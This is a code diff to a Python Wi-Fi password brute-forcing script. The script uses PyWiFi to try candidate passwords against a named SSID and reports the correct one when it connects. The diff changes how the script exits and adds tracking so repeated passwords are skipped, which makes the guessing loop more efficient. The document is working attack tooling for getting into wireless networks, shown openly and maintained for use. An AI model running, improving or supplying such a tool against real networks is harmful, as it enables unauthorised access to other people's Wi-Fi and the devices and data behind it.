@@ -3,6 +3,7 @@ import itertools  # Helps in generating combinations of passwords
 import os  # Provides functionalities for interacting with the operating system
 import random  # Used for shuffling the list of passwords
 import time  # Provides various time-related functions
+import sys  # Provides access to some variables used or maintained by the interpreter and to functions that interact strongly with the interpreter
 
 from pywifi import PyWiFi, const, Profile  # PyWiFi library for managing Wi-Fi connections
 from tqdm import tqdm  # A fast, extensible progress bar for Python and CLI
@@ -32,7 +33,7 @@ def get_wifi_interface():
     wifi = PyWiFi()
     if len(wifi.interfaces()) == 0:
         print("No Wi-Fi interface found. Please check your Wi-Fi adapter.")
-        exit()
+        sys.exit()
 
     iface = wifi.interfaces()[0]  # Select the first interface
     print(f"Using Wi-Fi adapter: {iface.name()}")  # Print the name of the interface
@@ -194,14 +195,23 @@ def try_passwords(ssid, file_path, iface):
     attempts = 0
     start_time = time.time()
 
+    # Define a set to store attempted passwords
+    attempted_passwords = set()
+
+    # Iterate over passwords until successful connection or all passwords are exhausted
     for password in passwords:
         attempts += 1
+        # Skip if password has been attempted before
+        if password in attempted_passwords:
+            continue
+
         print(f"[*] Trying password {attempts} of {total_passwords}: {password}")
+        attempted_passwords.add(password)  # Add password to attempted set
 
         if connect_wifi(ssid, password, iface):
             elapsed_time = time.time() - start_time
             print(GREEN + f"[+] Success! Correct password: {password} found in {format_time(elapsed_time)}." + RESET)
-            exit()  # Exit upon successful connection
+            sys.exit()  # Exit upon successful connection
 
         # Optional: Print progress and time elapsed periodically or upon certain conditions
         if attempts % 100 == 0 or attempts == total_passwords:
